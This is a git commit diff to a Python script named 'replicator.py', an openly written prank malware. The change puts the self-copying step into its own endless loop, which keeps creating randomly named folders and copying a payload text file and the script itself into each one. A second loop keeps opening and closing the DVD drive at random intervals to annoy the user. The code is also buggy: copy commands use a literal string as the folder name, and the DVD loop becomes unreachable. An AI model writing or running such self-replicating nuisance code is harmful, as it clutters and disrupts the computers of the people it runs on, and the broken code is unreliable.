0d669f6a2f577cfcb913ecbe579662279425775f
HawkHunt <cobraluuk@hotmail.com>
2016-11-24 22:43:20 +0100

    Now two independant loops, one to open and close the DVD drive and one to do the copying and pasting

--- Replicator/replicator.py
+++ Replicator/replicator.py
@@ -26,6 +26,23 @@ cmd = 'start payload.txt'
 #enters the variable into the CMD command
 os.system(cmd)
 
+x = 1
+while x==1:
+#Hexadecimal color code creator to make sure no folders have the same name. 
+	#This Hexadecimal code is then used as a folder name and a new one is generated each loop.
+	def gen_hex_colour_code():
+		return ''.join([random.choice('0123456789ABCDEF') for x in range(6)])
+	if __name__ == '__main__':
+		print (gen_hex_colour_code())
+	
+	#Makes a new new directory within the original folder called: clone
+	os.mkdir(gen_hex_colour_code())
+	#Runs a copy command where the Payload text file is copied to the newly made directory
+	os.system(r'copy kurwa.txt' 'gen_hex_colour_code()')
+	#Runs a copy command where the "replicator.py" is copied but it gets the name of the script from the ARGV
+	#library that we imported. It gets that from the last inputted CMD command when this file was first started.
+	os.system(r'copy ' + name + 'gen_hex_colour_code()')
+
 #while loop to do the opening and closing of the DVDdrive.
 #everything in this loop is ran on every iteration, That includes the creation of a new waitTime integers,
 #that is done to not create a pattern where the diskdrive opens and closes regularly and is this more annoying.
@@ -42,17 +59,4 @@ while True:
 	#Wait for however many seconds the "random" integer happens to be in this iteration of the loop.
 	time.sleep(waitTime)
 	
-	#Hexadecimal color code creator to make sure no folders have the same name. 
-	#This Hexadecimal code is then used as a folder name and a new one is generated each loop.
-	def gen_hex_colour_code():
-		return ''.join([random.choice('0123456789ABCDEF') for x in range(6)])
-	if __name__ == '__main__':
-		print (gen_hex_colour_code())
 	
-	#Makes a new new directory within the original folder called: clone
-	os.mkdir(gen_hex_colour_code())
-	#Runs a copy command where the Payload text file is copied to the newly made directory
-	os.system(r'copy kurwa.txt' 'gen_hex_colour_code()')
-	#Runs a copy command where the "replicator.py" is copied but it gets the name of the script from the ARGV
-	#library that we imported. It gets that from the last inputted CMD command when this file was first started.
-	os.system(r'copy ' + name + 'gen_hex_colour_code()')
